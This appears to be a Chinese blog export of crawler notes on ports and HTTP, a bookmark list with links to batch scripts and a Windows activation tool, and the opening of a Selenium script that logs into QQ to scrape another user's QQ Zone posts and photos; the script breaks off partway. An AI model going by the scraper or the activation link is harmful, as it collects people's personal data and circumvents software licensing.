<p>0到1024以下的端口号是系统保留使用的，程序猿在实际开发不要使用1024以下的端口号</p>
<h3 id="常见端口号"><a href="#常见端口号" class="headerlink" title="常见端口号"></a>常见端口号</h3><p>公有端口0-1023<br>HTTP:80<br>HTTPS:443<br>FTP:21<br>SSH:22<br>Telent:23<br>程序注册端口：1024-49151，分配用户或者程序<br>tomcat：8080<br>mysql:3306<br>oracle:1521</p>
<h3 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h3><p>通信协议(communications protocol)官方给出的定义是指双方实体完成通信或服务所必须遵循的规则和约定。<br>协议定义了数据单元使用的格式，信息单元应该包含的信息与含义，连接方式，信息发送和接收的时序，从而确保网络中数据顺利地传送到确定的地方。<br>简单来说，通讯协议又是指通信双方对数据传送控制的一种约定。约定中包括对数据格式，同步方式，传送速度，传送步骤，检纠错方式以及控制字符定义等问题做出统一规定，通信双方必须共同遵守。</p>
<p><img src="./img/20200426000421709.png" class="lazyload" data-srcset="./img/20200426000421709.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200426000421709"></p>
<h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><p>TCP是一种面向连接的、可靠的、基于字节流的传输层通信协议。即客户端和服务器之间在交换数据之前会先建立一个TCP连接，才能相互传输数据。并且提供超时重发，丢弃重复数据，检验数据，流量控制等功能，保证数据能从一端传到另一端。</p>
<h4 id="tcp三次握手和四次挥手"><a href="#tcp三次握手和四次挥手" class="headerlink" title="tcp三次握手和四次挥手"></a>tcp三次握手和四次挥手</h4><p>相关原文链接：<a href="https://blog.csdn.net/qq_38950316/article/details/81087809">https://blog.csdn.net/qq_38950316/article/details/81087809</a></p>
<p>应用场景 ：当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。在日常生活中，常见使用TCP协议的应用比如：浏览器使用HTTP，Outlook使用POP、SMTP，QQ文件传输等。HTTP 协议是基于应用层的协议，并且在传输层使用的 TCP 的可靠性通信协议。</p>
<h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>超文本传输协议（英文：HyperText Transfer Protocol，缩写：HTTP）是一种用于分布式、协作式和超媒体信息系统的应用层协议。HTTP是万维网的数据通信的基础。HTTP是一个客户端终端（用户）和服务器端（网站）请求和应答的标准（TCP）。</p>
<h4 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h4><p>HTTP/1.1协议中共定义了不同方式操作指定的资源：</p>
<h5 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h5><p>向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。</p>
<h5 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h5><p>与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。</p>
<h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。</p>
<h5 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h5><p>向指定资源位置上传其最新内容。</p>
<h5 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h5><p>请求服务器删除Request-URI所标识的资源。</p>
<h5 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h5><p>回显服务器收到的请求，主要用于测试或诊断。</p>
<h5 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h5><p>这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用’*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。</p>
<h4 id="HTTP常用请求方式-get与post请求的区别"><a href="#HTTP常用请求方式-get与post请求的区别" class="headerlink" title="HTTP常用请求方式: get与post请求的区别"></a>HTTP常用请求方式: get与post请求的区别</h4><p>GET提交的数据会放在URL之后，也就是请求行里面，以?分割URL和传输数据，参数之间以&amp;相连，如EditBook?name=test1&amp;id=123456。<br>而POST方法是把提交的数据放在HTTP包的请求体中.</p>
<p>GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制.</p>
<h4 id="HTTP请求格式-请求协议"><a href="#HTTP请求格式-请求协议" class="headerlink" title="HTTP请求格式(请求协议)"></a>HTTP请求格式(请求协议)</h4><p><img src="./img/2020042600331571.png" class="lazyload" data-srcset="./img/2020042600331571.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2020042600331571"></p>
<p><img src="./img/20200426003332696.png" class="lazyload" data-srcset="./img/20200426003332696.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200426003332696"></p>
<h4 id="HTTP响应格式（响应协议）"><a href="#HTTP响应格式（响应协议）" class="headerlink" title="HTTP响应格式（响应协议）"></a>HTTP响应格式（响应协议）</h4><p><img src="./img/20200426003413525.png" class="lazyload" data-srcset="./img/20200426003413525.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200426003413525"></p>
<p><img src="./img/20200426003434748.png" class="lazyload" data-srcset="./img/20200426003434748.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200426003434748"></p>
<h4 id="HTTP常见的状态码"><a href="#HTTP常见的状态码" class="headerlink" title="HTTP常见的状态码"></a>HTTP常见的状态码</h4><p>200 OK：表明该请求被成功地完成，所请求的资源发送回客户端；</p>
<p>302 Found：重定向，新的URL会在Response 中的Location中返回，浏览器将会自动使用新的URL发出新的Request；</p>
<p>304 Not Modified：代表上次的文档已经被缓存了， 还可以继续使用；</p>
<p>400 Bad Request：客户端请求与语法错误，不能被服务器所理解；</p>
<p>403 Forbidden：服务器收到请求，但是拒绝提供服务；</p>
<p>404 Not Found：请求资源不存在（输错了URL）；</p>
<p>500 Internal Server Error：服务器发生了不可预期的错误；</p>
<p>503 Server Unavailable：服务器当前不能处理客户端的请求，一段时间后可能恢复正常；</p>
<h4 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h4><p>https=http+ssl，顾名思义，https是在http的基础上加上了SSL保护壳，信息的加密过程就是在SSL中完成的https，是以安全为⽬标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加⼊SSL层，HTTPS的安全基础是SSL。</p>
<h1 id="网络爬虫"><a href="#网络爬虫" class="headerlink" title="网络爬虫"></a>网络爬虫</h1><h2 id="网络爬虫的定义"><a href="#网络爬虫的定义" class="headerlink" title="网络爬虫的定义"></a>网络爬虫的定义</h2><p>网络爬虫（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。对于我们来说，爬虫需要我们自己写，可以下载的我们眼里最有价值的数据。</p>
<h3 id="爬虫的分类"><a href="#爬虫的分类" class="headerlink" title="爬虫的分类"></a>爬虫的分类</h3><h4 id="通用网络爬虫"><a href="#通用网络爬虫" class="headerlink" title="通用网络爬虫"></a>通用网络爬虫</h4><p>也称全网爬虫，顾名思义，就是爬取的目标是互联网中的所有数据资源，主要应用于大型搜索引擎中<br>通用型爬虫也是一个程序，可以从任何一个网友出发，用图的遍历算法，自动的访问每一个网友并存储在服务器里。<br>我们所熟悉的搜索引擎，如谷歌、百度、搜狗、必应、360，TA们的核心技术就是爬虫，属于通用型爬虫。</p>
<p>考虑的方面：<br>遍历算法的选择，如何在尽量短的时间下载所有网页 ？<br>如何高效 URL 去重 ？<br>如何避免漏掉网页呢 ？<br>JavaScript生成的网页，如何准确的提取出 URL 呢 ？<br>如何协调成千上万的服务器 ？<br>静态网页和动态网页需不需要分别处理 ？</p>
<h4 id="聚焦网络爬虫"><a href="#聚焦网络爬虫" class="headerlink" title="聚焦网络爬虫"></a>聚焦网络爬虫</h4><p>也称主题网络爬虫，按照预先定义好的主题有选择地进行网页爬取，爬取特定的资源。聚焦型爬虫与通用型爬虫的区别在于： 聚焦爬虫在实施网页抓取时会对内容进行处理筛选，尽量保证只抓取与需求相关的网页信息。<br>通用型爬虫是搜索引擎的原身，也是一个程序；而聚焦型爬虫也是一个程序，主要是代替浏览器的程序根据我们设定的规则批量提取相关数据，而不需要我们去手动提取（通用型爬虫做不到这一点）。</p>
<h4 id="增量式网络爬虫"><a href="#增量式网络爬虫" class="headerlink" title="增量式网络爬虫"></a>增量式网络爬虫</h4><p>指对下载⽹⻚采取增量式的更新和只爬⾏新产⽣的或者已经发⽣变化的⽹⻚爬⾍</p>
<h4 id="深层网络爬"><a href="#深层网络爬" class="headerlink" title="深层网络爬"></a>深层网络爬</h4><p>不需要登录就能获取的页面叫做表层页面，需要提交表单登录后才能获取的页面叫做深层页面，爬取深层页面需要想办法填写好表单</p>
<h2 id="爬虫的基本步骤"><a href="#爬虫的基本步骤" class="headerlink" title="爬虫的基本步骤"></a>爬虫的基本步骤</h2><p>获取数据：爬虫程序会根据提供的网址，向服务器发起请求，而后返回数据；<br>解析数据：爬虫程序把服务器返回的数据解析成我们能读懂的格式；<br>提取数据：爬虫程序再从中提取出需要的数据；<br>存储数据：爬虫程序把有用的数据保存起来，便于日后使用和分析</p>
<h2 id="爬虫涉及的-Python-模块"><a href="#爬虫涉及的-Python-模块" class="headerlink" title="爬虫涉及的 Python 模块"></a>爬虫涉及的 Python 模块</h2><p>request：获取网页信息，文本、音频、图片都可以的。<br>Json：解析 XHR 数据，也可以把字符串转为字典/列表<br>bs4：解析网页源代码，提取需要的数据<br>re：功能同 bs4，不过功能更强且大多数编程语言都支持<br>csv：存储数据(文件形式)<br>selenium：浏览器自动化<br>openpyxl：存储数据(excel文件形式)<br>gevent：异步爬虫，建立爬虫军队加速爬取数据<br>SMTP：电子邮件 发送<br>wxpy：微信消息 处理<br>pyautogui：鼠标键盘 自动化<br>MongoDB：数据库<br>Scrapy：爬虫框架</p>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title>工具集</title>
    <url>//%E7%BD%91%E5%9D%80%E6%94%B6%E8%97%8F</url>
    <content><![CDATA[<h2 id="问答社区"><a href="#问答社区" class="headerlink" title="问答社区"></a><a href="http://wd023.com/" target="_blank">问答社区</a></h2><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a><a href="http://demo443.com/data%20analysis/index.html" target="_blank">数据分析</a></h2><h2 id="晓东博客"><a href="#晓东博客" class="headerlink" title="晓东博客"></a><a href="http://demo443.com:9527/" target="_blank">晓东博客</a></h2><h2 id="苦海无涯"><a href="#苦海无涯" class="headerlink" title="苦海无涯"></a><a href="http://demo443.com/lishi/index.html" target="_blank">苦海无涯</a></h2><p><a href="http://www.baidu.com/" target="_blank"><img src="https://gss0.bdstatic.com/70cFsjip0QIZ8tyhnq/img/logo-80px.gif" class="lazyload" data-srcset="https://gss0.bdstatic.com/70cFsjip0QIZ8tyhnq/img/logo-80px.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Baidu" align="bottom" border="0"></a></p>
<p><a href="https://www.google.com.hk/" target="_blank">Google搜索</a>-谷歌搜索</p>
<p><a href="https://www.bilibili.com/" target="_blank">哔哩哔哩</a>-bilibili是国内知名的视频弹幕网站,这里有及时的动漫新番,活跃的ACG氛围,有创意的Up主。大家可以在这里找到许多欢乐。</p>
<p><a href="https://123.sogou.com/" target="_blank"> 搜狗导航 </a>  – 搜狗网址导航</p>
<p><a href="https://translate.google.cn/" target="_blank">谷歌翻译</a>– 谷歌翻译</p>
<p><a href="https://aiqicha.baidu.com/" target="_blank">爱企查</a>– 爱企查-查公司，网站</p>
<p><a href="https://mail.qq.com/" target="_blank">QQ邮箱</a>– QQ邮箱网页版登陆界面</p>
<p><a href="https://shenzjd.com/shenzjd/tupian/" rel="nofollow noopener noreferrer" target="_blank">电脑壁纸</a> – 神族九帝网高清壁纸下载</p>
<p><a href="https://www.aiaisucai.com/index/account/login.html" target="_blank">爱爱素材</a> – UI素材下载网-需要登陆</p>
<p><a href="https://www.17sucai.com/" rel="nofollow noopener noreferrer"
                                        target="_blank">17 素 材</a> –jQuery网页特效最全网页模板和网站模板jQuery代码_17素材网_</p>
<p><a href="http://www.pptkj.net/" target="_blank">PPT课件网</a>– ppt课件网-免费ppt课件下载</p>
<p><a href="https://ppt.sotary.com/web/wxapp/index.html" target="_blank">ppt超级市场</a>– ppt超级市场，网站</p>
<p><a href="https://www.aconvert.com/cn/document/" target="_blank">在线转换文档文件</a>– 在线转换文档文件，网站</p>
<p><a href="https://www.ddosi.com/" target="_blank">🔰雨苁ℒ🔰</a>– 一个有趣的网站</p>
<h2 id="数据分析-1"><a href="#数据分析-1" class="headerlink" title="数据分析"></a>数据分析</h2><p><a  href="https://www.osgeo.cn/scrapy/intro/overview.html" rel="nofollow noopener noreferrer"  target="_blank" >Scrapy</a> – Scrapy框架API</p>
<p><a href="https://www.numpy.org.cn/" rel="nofollow noopener noreferrer" target="_blank">NumPy</a>– NumPy 中文API文档。</p>
<p><a href="https://www.jianshu.com/p/a77b0bc736f2/" rel="nofollow noopener noreferrer" target="_blank">Pandas</a>– 简书-Pandas 中文API文档。</p>
<p><a href="http://www.mysqlab.net/docs/view/refman-5.1-zh/chapter/sql-syntax.html"  target="_blank">MySQL</a>– MySql 实验室</p>
<p><a href="https://www.runoob.com/redis/redis-tutorial.html" target="_blank">Redis</a>– Redis 教程</p>
<h2 id="script"><a href="#script" class="headerlink" title="script"></a>script</h2><p>浏览器清除浏览数据：chrome://settings/clearBrowserData</p>

<p><a href="http://fp1.demo443.com/%E5%85%B3%E6%9C%BA.bat">关机.bat</a>–批处理脚本</p>
<p><a href="http://fp1.demo443.com/%E6%9A%B4%E5%8A%9B%E5%9B%9E%E6%94%B6%E7%AB%99.bat">暴力回收站.bat</a>–批处理脚本</p>
<p><a href="http://fp1.demo443.com/%E6%B8%85%E7%90%86C%E7%9B%98%E5%9E%83%E5%9C%BE%E8%84%9A%E6%9C%AC.bat">清理C盘垃圾.bat</a>–批处理脚本</p>
<p><a href="http://fp1.demo443.com/%E8%A7%A3%E9%94%81%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8.reg">解锁任务栏管理器.bat</a>–批处理脚本</p>
<p><a href="http://fp1.demo443.com/%E9%85%8D%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8.bat">配置开机启动项.bat</a>–批处理脚本</p>
<p><a href="http://fp1.demo443.com/chkdsk.bat">磁盘检查修复.bat</a>–批处理脚本</p>
<p><a href="http://fp1.demo443.com/kill-%E8%BF%9B%E7%A8%8B.bat">kill-进程.bat</a>–批处理脚本</p>
<p><a href="http://fp.demo443.com/Shortcuts/explorer.exe">桌面程序</a></p>
<p>%windir%\explorer.exe shell:::{4234d49b-0245-4df3-b780-3893943456e1}快捷方式清除流氓软件</p>

<p><a href="https://www.cnblogs.com/cheyunhua/p/10594981.html" rel="nofollow noopener noreferrer" target="_blank">Python三十个常见的脚本汇总</a> –博客园_Python三十个常见的脚本汇总</p>
<h2 id="电影电视网站"><a href="#电影电视网站" class="headerlink" title="电影电视网站"></a>电影电视网站</h2><p><a href="https://v.qq.com/" target="_blank">腾讯视频</a>                                 - 中国领先的在线视频媒体平台,海量高清视频在线观看</p>
<p><a href="https://www.iqiyi.com/" target="_blank">爱奇艺</a>                                      - 在线视频网站-海量正版高清视频在线观看</p>
<p><a href="https://www.youku.com/" target="_blank">优酷</a>                                        - 这世界很酷</p>
<p><a href="https://www.pptv.com/" target="_blank">PPTV</a>                                      - 网络电视，电影。</p>
<p><a href="http://www.le.com/" target="_blank">乐视视频</a>                                  -乐视视频–-乐视旗下专业的影视剧视频网站_高清视频在线观看_</p>
<p><a href="https://tv.sohu.com/" target="_blank">搜狐视频</a>                                  –中国领先的综合视频网站,正版高清视频在线观看,原创视频上传,全网视频搜索</p>
<p><a href="https://www.yhdmz.com//" target="_blank">樱花动漫</a>                                  –拥有上万集高清晰画质的在线动漫，观看完全免费、无须注册、高速播放</p>
<p><a href="https://www.agefans.cc/" target="_blank">AGE动漫</a>                                   -AGE动漫专注于资源收集整理 海量的有效的高质量的动漫资源下载 动漫百度网盘下载</p>
<p><a href="https://movie.douban.com/" target="_blank">豆瓣电影</a>                                     -豆瓣电影提供最新的电影介绍及评论包括上映影片的影讯查询及购票服务。</p>
<p><a href="https://www.360kan.com/" target="_blank">360影视</a>                                      -360影视-更新更全更受欢迎的影视网站-在线观看</p>
<p><a href="https://v.sogou.com/" target="_blank">搜狗影视</a>                                      -搜狗视频，视频聚合平台，拥有全网更新更热视频内容。为用户提供高清电影,电视剧,动漫,综艺等视频</p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p><a href="http://wd023.com/forum.php?mod=viewthread&tid=67"
                                        rel="nofollow noopener noreferrer" target="_blank">Python 爬取 QQ 空间说说和相册</a>               –来自问答论坛..</p>
<p><a href="https://zhidao.baidu.com/question/174471579.html" rel="nofollow noopener noreferrer" target="_blank">chkdsk </a></p>
<p><a href="http://www.miui.com/shuaji-393.html"
                                        rel="nofollow noopener noreferrer" target="_blank">MIUI线刷升级</a> </p>
<p><a href="https://blog.csdn.net/qq_40674583/article/details/81940974"
                                        rel="nofollow noopener noreferrer" target="_blank">python常用模块 </a>                                  – Python常用模块大全（总结）_changaspl-CSDN博客_python模块 </p>
<p><a href="https://www.cnblogs.com/Jansens520/p/8469899.html"
                                        rel="nofollow noopener noreferrer" target="_blank">python项目飞机大战</a>                            – python项目飞机大战 - Jansens - 博客园</p>
<p><a href="https://blog.csdn.net/ybp1137287436/article/details/79559925"
                                        rel="nofollow noopener noreferrer" target="_blank">面向对象小练习</a>                                    一道不错的综合题_迷途之路-CSDN博客</p>
<p><a href ="http://www.8fe.com/jiaocheng/2360.html " target= "__blank">谷歌浏览器提示无法安全下载 </a>             – Chrome浏览器提示无法安全地下载解决办法</p>
<h2 id="工具集"><a href="#工具集" class="headerlink" title="工具集"></a>工具集</h2><p><a href="http://101.34.178.236:1024/tree" target="_blank">jupyter-服务</a>                 – 已搭建好的jupyter-服务    </p>
<p><a href="https://www.google.cn/intl/zh-CN/chrome/"
                                        target="_blank">Chrome</a>                       – 谷歌浏览器官网下载                                    </p>
<p><a href="https://pinyin.sogou.com/" target="_blank">搜狗输入法</a>                  – 搜狗输入法官网        </p>
<p><a href="http://npm.taobao.org/mirrors/chromedriver/"
                                        target="_blank">chromedriver</a>               – 谷歌浏览器驱动                    </p>
<p><a href="./do/Fiddler.rar" download="./do/Fiddler.rar">Fiddler</a>                         -文件_Fiddler抓包工具</p>
<p><a href="https://www.python.org/downloads/windows/"
                                            target="_blank">python安装包</a>               – python官网安装包</p>
<p><a href="https://www.jetbrains.com/pycharm/download/#section=windows"
                                            target="_blank">pycharm安装包</a>             – pycharm官网安装包</p>
<p><a href="https://www.anaconda.com/products/individual#Downloads"
                                            target="_blank">Anaconda</a>                      – Anaconda官网下载</p>
<p><a href="https://www.bazhuayu.com/download/windows" target="_blank">spider</a>                              – 八爪鱼官网下载链接</p>
<p><a href="https://www.voidtools.com/zh-cn/" target="_blank">Everything</a>                      – Everything安装包</p>
<p><a href="https://www.airdisk.cc/download/c-3/"
                                            target="_blank">airdisk-NAS</a>                   – airdisk-NAS-安装包</p>
<p><a href="http://www.yishimei.cn/network/319.html" target="_blank">Windows系统激活工具</a><br>                                        – Windows系统激活工具</p>
<p><a href="https://free.3v.do/" target="_blank">免费空间</a><br>                                        – 100M免费空间-可扩容</p>
<p><a href="https://cloud.tencent.com/" target="_blank">腾讯云</a><br>                                        – 腾讯云-服务器主页</p>
<p><a href="https://www.dcloud.io/hbuilderx.html" target="_blank">HbuilderX</a><br>                                        – HBuilder是当前最快的HTML开发工具,强大的代码助手</p>
<p><a href="https://code.visualstudio.com/" target="_blank">vscode</a><br>                                        –xvscode官网</p>
<p><a href="http://fp1.demo443.com/XMind.rar">XMind</a><br>                                        -文件_xmind脑图</p>
<p><a href="http://fp1.demo443.com/ftp%E5%B7%A5%E5%85%B7.rar">Xshell &amp; xftp</a><br>                                         -文件_  xshell &amp; xftp</p>
<p><a href="http://fp1.demo443.com/TakeColor.exe">TakeColor.exe</a>                   -文件-TakeColor.exe 取色器</p>
<p><a href="http://fp1.demo443.com/Inet.Download.Manager.v6.38.18.2.exe">IDM</a>                                  –文件-IDM下载器-绿色版                </p>
<p><a href="http://fp1.demo443.com/VMware_%E8%99%9A%E6%8B%9F%E6%9C%BA16.rar">VMware虚拟机</a>                –文件-VMware虚拟机</p>
<p><a href="http://fp1.demo443.com/%E5%8A%A0%E5%8D%A1%20%20%E6%95%99%E5%B8%88%E7%AB%AF%E5%8F%8A%E5%AD%A6%E7%94%9F%E7%AB%AF.rar">伽卡他卡师生端</a>                –文件-伽卡他卡师生端</p>
<p><a href="https://www.wps.cn/" target="_blank">WPS</a>                                 –WPS官方网站_金山办公_办公软件与办公方式的开拓者和引领者</p>
<p><a href="http://fp1.demo443.com/win%E6%A1%8C%E9%9D%A2%E4%BF%AE%E5%A4%8D_Explorer.exe_All.rar">win系统桌面修复工具</a>         -Explorer.exe_All 修复win7-win10 桌面异常</p>
<p><a href="http://fp.demo443.com/npp.7.9.5.Installer.x64.exe">notepad++.exe</a>                   -必备的文本编辑器,小巧高效,支持27种编程语言,软件点击下载</p>
<p><a href="https://u.tools/" target="_blank">Utool 官网</a>                         –你的生产力工具集 自由集成丰富插件，快速匹配「场景功能」，用完即走</p>
<p><a href="https://guanjia.qq.com/sem/924/index.html?ADTAG=media.buy.baidu.SEM"
                                        target="_blank">WinRAR</a>                            –压缩&amp;解压软件</p>
<p><a href="https://www.typora.io/#windows" target="_blank">typora 官网</a>                        –Typora可以直接在markdown中画流程图,而且语法简洁易懂</p>
<p><a href="https://www.360.cn/" target="_blank">360安全卫士</a>                        –360官网</p>
<p><a href="https://www.stellarplayer.com/" target="_blank">恒星播放器</a>                            –恒星播放器-视觉享受 随心而动</p>
<p><a href="https://gitee.com/" target="_blank">gitee</a>                                    – Gitee - 基于 Git 的代码托管和研发协作平台</p>
<p><a href="http://www.moguproxy.com/buy/" target="_blank">蘑菇代理</a>                                – 蘑菇http</p>
<p><a href="https://www.microsoft.com/zh-CN/download/details.aspx?id=58494" target="_blank">Power BI</a>                                    – Microsoft Power BI Desktop                                </p>
<p><a href="https://wenshu.court.gov.cn/" target="_blank">中国裁判文书网</a>                         – 中国裁判文书网</p>
<p><a href="http://zxgk.court.gov.cn/" target="_blank">中国执行信息公开网</a>                 – 中国执行信息公开网</p>
<p><a href="http://www.gsxt.gov.cn/corp-query-homepage.html" target="_blank">国家企业信用信息公示系统</a>                         – 国家企业信用信息公示系统</p>
<p><a href="https://extremevision.com.cn/algos" target="_blank">算法商城</a>                                            – 极视角-首家AI视觉算法商城</p>
<p><a href="https://www.oray.com/" target="_blank">花生壳套装</a>                                        – 贝锐官网|花生壳官网|DNS内网穿透|域名注册|向日葵远程控制|远程桌面|蒲公英路由器-贝锐官网</p>
<p><a href="https://pngimg.com/" target="_blank">图片资源网</a>                                    – PNG images | 100 000+ Free PNG images</p>
<p><a href="http://help.dvr163.com/index.php/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6" target="_blank">易视云软件</a>                                    – 易视云软件</p>
<p><a href="http://www.feiq18.com/" target="_blank">飞秋官网</a>                                        一款PC端局域网即时通讯软件</p>
<h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><p><a href="https://www.bt.cn/" target="_blank">宝塔面板</a><br>                                —— 宝塔面板&amp;官网..8889</p>
<p><a href="https://cn.wordpress.org/" target="_blank">WordPress</a><br>                                —— WordPress.org China 简体中文</p>
<p><a href="https://portal.qiniu.com/home" target="_blank">七牛云</a><br>                                        – 七牛云- 对象存储kodo</p>
<p><a href="https://addon.dismall.com/" target="_blank">Discuz应用中心</a><br>                                        – 论坛网站安装</p>
<p><a href="https://tool.lu/c/other" target="_blank">在线工具</a><br>                                        – 在线工具</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>reading</tag>
      </tags>
  </entry>
  <entry>
    <title>QQ空间数据抓取</title>
    <url>//QQ%E7%A9%BA%E9%97%B4%E6%95%B0%E6%8D%AE%E6%8A%93%E5%8F%96</url>
    <content><![CDATA[<h1 id="QQ空间数据抓取"><a href="#QQ空间数据抓取" class="headerlink" title="QQ空间数据抓取"></a>QQ空间数据抓取</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆QQ访问对方QQ空间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">login_qq, password, business_qq</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    登陆</span></span><br><span class="line"><span class="string">    :param login_qq: 登陆用的QQ</span></span><br><span class="line"><span class="string">    :param password: 登陆的QQ密码</span></span><br><span class="line"><span class="string">    :param business_qq: 业务QQ</span></span><br><span class="line"><span class="string">    :return: driver</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始登陆中...&quot;</span>)</span><br><span class="line">    driver.get(<span class="string">&#x27;https://user.qzone.qq.com/&#123;&#125;/311&#x27;</span>.<span class="built_in">format</span>(business_qq))  <span class="comment"># URL</span></span><br><span class="line">    driver.implicitly_wait(<span class="number">10</span>)  <span class="comment"># 隐示等待，为了等待充分加载好网址</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;login_div&#x27;</span>)</span><br><span class="line">    driver.switch_to.frame(<span class="string">&#x27;login_frame&#x27;</span>)  <span class="comment"># 切到输入账号密码的frame</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;switcher_plogin&#x27;</span>).click()  <span class="comment">##点击‘账号密码登录’</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;u&#x27;</span>).clear()  <span class="comment">##清空账号栏</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;u&#x27;</span>).send_keys(login_qq)  <span class="comment"># 输入账号</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;p&#x27;</span>).clear()  <span class="comment"># 清空密码栏</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;p&#x27;</span>).send_keys(password)  <span class="comment"># 输入密码</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;login_button&#x27;</span>).click()  <span class="comment"># 点击‘登录’</span></span><br><span class="line">    driver.switch_to.default_content()</span><br><span class="line"></span><br><span class="line">    driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">    time.sleep(<span 